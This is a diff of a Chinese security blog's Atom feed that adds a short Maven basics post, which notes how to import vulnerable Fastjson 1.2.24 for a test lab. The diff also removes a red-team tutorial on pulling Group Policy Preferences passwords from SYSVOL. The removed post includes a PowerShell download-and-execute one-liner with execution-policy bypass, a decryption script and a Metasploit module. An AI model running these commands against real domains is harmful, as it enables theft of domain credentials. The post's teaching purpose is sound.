@@ -6,7 +6,7 @@
   <link href="https://www.teamssix.com/atom.xml" rel="self"/>
   
   <link href="https://www.teamssix.com/"/>
-  <updated>2021-10-30T00:55:09.332Z</updated>
+  <updated>2021-11-03T08:32:09.926Z</updated>
   <id>https://www.teamssix.com/</id>
   
   <author>
@@ -15,6 +15,33 @@
   </author>
   
   <generator uri="https://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>【代码审计】Maven 基础知识</title>
+    <link href="https://www.teamssix.com/211103-161807.html"/>
+    <id>https://www.teamssix.com/211103-161807.html</id>
+    <published>2021-11-03T08:18:07.000Z</published>
+    <updated>2021-11-03T08:32:09.926Z</updated>
+    
+    <content type="html"><![CDATA[<h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p>Maven 是一个项目构建和管理工具，利用它可以对 JAVA 项目进行构建和管理。</p><p>Maven 采用项目对象模型 POM（Project Object Model）来管理项目。</p><p>Maven 的主要工作就是用来解析一些 XML 文档、管理生命周期与插件。</p><p>Maven 被设计成将主要的职责委派给一组 Maven 插件，这些插件可以影响 Maven 生命周期，提供对目标的访问。</p><h2 id="0x01-pom-xml-文件介绍"><a href="#0x01-pom-xml-文件介绍" class="headerlink" title="0x01 pom.xml 文件介绍"></a>0x01 pom.xml 文件介绍</h2><p>pom.xml 文件被用于管理源代码、配置文件、开发者的信息和角色等，Maven 项目中可以没有其他文件但必须包含 pom.xml 文件，该文件也是 Maven 项目的核心配置文件。</p><p>一个引入 Fastjson 1.2.24 版本组件的配置信息如下：</p><pre class="line-numbers language-none"><code class="language-none">&lt;dependencies&gt;  &lt;!-- https:&#x2F;&#x2F;mvnrepository.com&#x2F;artifact&#x2F;com.alibaba&#x2F;fastjson --&gt;  &lt;dependency&gt;    &lt;groupId&gt;com.alibaba&lt;&#x2F;groupId&gt;    &lt;artifactId&gt;fastjson&lt;&#x2F;artifactId&gt;    &lt;version&gt;1.2.24&lt;&#x2F;version&gt;  &lt;&#x2F;dependency&gt;&lt;&#x2F;dependencies&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>该配置信息可直接从 <a href="https://mvnrepository.com/artifact/com.alibaba/fastjson/1.2.24">https://mvnrepository.com/artifact/com.alibaba/fastjson/1.2.24</a> 获得</p></blockquote><p>配置文件里的 dependencies 和 dependency 用于定义依赖关系，dependency 里的 groupId、artifactId、version 用来定义所依赖的项目。</p><h1 id="0x02-Maven-的使用"><a href="#0x02-Maven-的使用" class="headerlink" title="0x02 Maven 的使用"></a>0x02 Maven 的使用</h1><p>这里以 IntelliJ IDEA 为例，在新建项目时选择创建 Maven 项目即可。</p><p>在创建完 Maven 项目后，就会看到项目里包含的 pox.xml 文件了，对于安全人员就可以通过该文件去判断当前项目里是否包含了存在隐患的组件。</p><p>这时如果想搭建一个 Fastjson &lt;= 1.2.24 版本的漏洞环境，就需要将 Fastjson &lt;= 1.2.24 版本的组件引入。</p><p>这里只需要把上面的配置信息复制到 pom.xml 文件中，然后右击 pom.xml 文件选择「Maven」–「重新加载项目」，就可以自动进行组件的获取了。</p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/202111031614583.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p><p>稍后等组件被自动下载到本地并自动加入到项目依赖中后，就可以在项目代码使用该组件了。</p><blockquote><p>参考文章：</p><p><a href="https://www.jianshu.com/p/43ed2e9e386b">https://www.jianshu.com/p/43ed2e9e386b</a></p><p><a href="https://www.cnblogs.com/bndong/p/9762067.html">https://www.cnblogs.com/bndong/p/9762067.html</a></p><p><a href="https://www.cnblogs.com/cainiaomahua/p/10651014.html">https://www.cnblogs.com/cainiaomahua/p/10651014.html</a></p></blockquote><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/TeamsSix_Subscription_Logo2.png"></p>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;h1 id=&quot;0x00-前言&quot;&gt;&lt;a href=&quot;#0x00-前言&quot; class=&quot;headerlink&quot; title=&quot;0x00 前言&quot;&gt;&lt;/a&gt;0x00 前言&lt;/h1&gt;&lt;p&gt;Maven 是一个项目构建和管理工具，利用它可以对 JAVA 项目进行构建和管理。&lt;/p&gt;
+&lt;p&gt;M</summary>
+      
+    
+    
+    
+    <category term="代码审计" scheme="https://www.teamssix.com/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
+    
+    
+    <category term="学习笔记" scheme="https://www.teamssix.com/tags/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
+    
+    <category term="代码审计" scheme="https://www.teamssix.com/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
+    
+  </entry>
   
   <entry>
     <title>【经验总结】Docker 使用笔记</title>
@@ -538,34 +565,6 @@
       
       
     <summary type="html">&lt;h2 id=&quot;0、前言&quot;&gt;&lt;a href=&quot;#0、前言&quot; class=&quot;headerlink&quot; title=&quot;0、前言&quot;&gt;&lt;/a&gt;0、前言&lt;/h2&gt;&lt;p&gt;令牌（Token）是指系统中的临时秘钥，相当于账户和密码，有了令牌就可以在不知道密码的情况下访问目标相关资源了，这些令牌将持</summary>
-      
-    
-    
-    
-    <category term="内网学习笔记" scheme="https://www.teamssix.com/categories/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
-    
-    
-    <category term="红队" scheme="https://www.teamssix.com/tags/%E7%BA%A2%E9%98%9F/"/>
-    
-    <category term="学习笔记" scheme="https://www.teamssix.com/tags/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
-    
-    <category term="内网" scheme="https://www.teamssix.com/tags/%E5%86%85%E7%BD%91/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>【内网学习笔记】16、组策略凭据获取</title>
-    <link href="https://www.teamssix.com/210728-145329.html"/>
-    <id>https://www.teamssix.com/210728-145329.html</id>
-    <published>2021-07-28T06:53:29.000Z</published>
-    <updated>2021-08-04T08:22:03.550Z</updated>
-    
-    <content type="html"><![CDATA[<h2 id="0、前言"><a href="#0、前言" class="headerlink" title="0、前言"></a>0、前言</h2><p>SYSVOL 是活动目录里的一个用于存储域公共文件服务器副本的共享文件夹，在域中的所有域控之间进行复制，SYSVOL 在所有经过身份验证的域用户或者域信任用户具有读权限的活动目录域范围内共享，所有的域策略均存放在 C:\Windows\SYSVOL\DOMAIN\Policies\ 目录中。</p><p>管理员在域中新建一个组策略后，系统会自动在 SYSVOL 目录中生成一个 XML 文件。</p><p>该文件中保存了该组策略更新后的密码，该密码使用 AES-256 算法，但 2012 年微软公布了该密码的私钥，也就是说任何人都可以对其进行解密。</p><h2 id="1、查找包含-cpassword-的-XML-文件"><a href="#1、查找包含-cpassword-的-XML-文件" class="headerlink" title="1、查找包含 cpassword 的 XML 文件"></a>1、查找包含 cpassword 的 XML 文件</h2><p>浏览 SYSVOL 文件夹，手动查找包含 cpassword 的 XML 文件</p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/20210728141704.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p><p>或者使用 findstr 自动搜索包含 cpassword 的 XML 文件</p><pre class="line-numbers language-none"><code class="language-none">findstr &#x2F;s &#x2F;i &quot;cpassword&quot; C:\Windows\SYSVOL\*.xml<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/20210728142511.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p><h2 id="2、解密-cpassword-密文"><a href="#2、解密-cpassword-密文" class="headerlink" title="2、解密 cpassword 密文"></a>2、解密 cpassword 密文</h2><h3 id="python-脚本"><a href="#python-脚本" class="headerlink" title="python 脚本"></a>python 脚本</h3><p> Gpprefdecrypt.py 下载地址：<a href="https://raw.githubusercontent.com/leonteale/pentestpackage/master/Gpprefdecrypt.py">https://raw.githubusercontent.com/leonteale/pentestpackage/master/Gpprefdecrypt.py</a></p><pre class="line-numbers language-none"><code class="language-none">python2.7 Gpprefdecrypt.py Wdkeu1drbxqPJm7YAtPtwBtyzcqO88hJUBDD2eseoY0<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/20210728143302.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p><h3 id="PowerShell-脚本"><a href="#PowerShell-脚本" class="headerlink" title="PowerShell 脚本"></a>PowerShell 脚本</h3><p>PowerSploit 项目中提供了 Get-GPPPassword.ps1 脚本。</p><p>脚本下载地址：<a href="https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Get-GPPPassword.ps1">https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Get-GPPPassword.ps1</a></p><p>直接远程下载脚本执行：</p><pre class="line-numbers language-none"><code class="language-none">PowerShell.exe -Exec Bypass -C &quot;IEX(New-Object Net.WebClient).DownloadString(&#39;https:&#x2F;&#x2F;raw.githubusercontent.com&#x2F;PowerShellMafia&#x2F;PowerSploit&#x2F;master&#x2F;Exfiltration&#x2F;Get-GPPPassword.ps1&#39;);Get-GPPPassword&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>如果无法下载可以使用 github 代理</p><pre class="line-numbers language-none"><code class="language-none">PowerShell.exe -Exec Bypass -C &quot;IEX(New-Object Net.WebClient).DownloadString(&#39;https:&#x2F;&#x2F;ghproxy.com&#x2F;https:&#x2F;&#x2F;raw.githubusercontent.com&#x2F;PowerShellMafia&#x2F;PowerSploit&#x2F;master&#x2F;Exfiltration&#x2F;Get-GPPPassword.ps1&#39;);Get-GPPPassword&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/20210728144214.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p><p>或者下载到本地，执行也行</p><pre class="line-numbers language-none"><code class="language-none">Import-Module .\Get-GPPPassword.ps1Get-GPPPassword<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>如果 PowerShell 由于处在受限模式以至于无法导入脚本，可以使用以下命令绕过。</p><pre class="line-numbers language-none"><code class="language-none">powershell.exe -exec bypass -command &quot;&amp;&#123;Import-Module .\Get-GPPPassword.ps1;Get-GPPPassword&#125;&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="MSF"><a href="#MSF" class="headerlink" title="MSF"></a>MSF</h3><p>使用 post/windows/gather/credentials/gpp 模块也可以</p><pre class="line-numbers language-none"><code class="language-none">use post&#x2F;windows&#x2F;gather&#x2F;credentials&#x2F;gppset session 1run<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/20210728145138.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p><blockquote><p>更多信息欢迎关注我的微信公众号：TeamsSix</p></blockquote><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/TeamsSix_Subscription_Logo2.png"></p>]]></content>
-    
-    
-      
-      
-    <summary type="html">&lt;h2 id=&quot;0、前言&quot;&gt;&lt;a href=&quot;#0、前言&quot; class=&quot;headerlink&quot; title=&quot;0、前言&quot;&gt;&lt;/a&gt;0、前言&lt;/h2&gt;&lt;p&gt;SYSVOL 是活动目录里的一个用于存储域公共文件服务器副本的共享文件夹，在域中的所有域控之间进行复制，SYSVOL 在所有</summary>
       
     
     
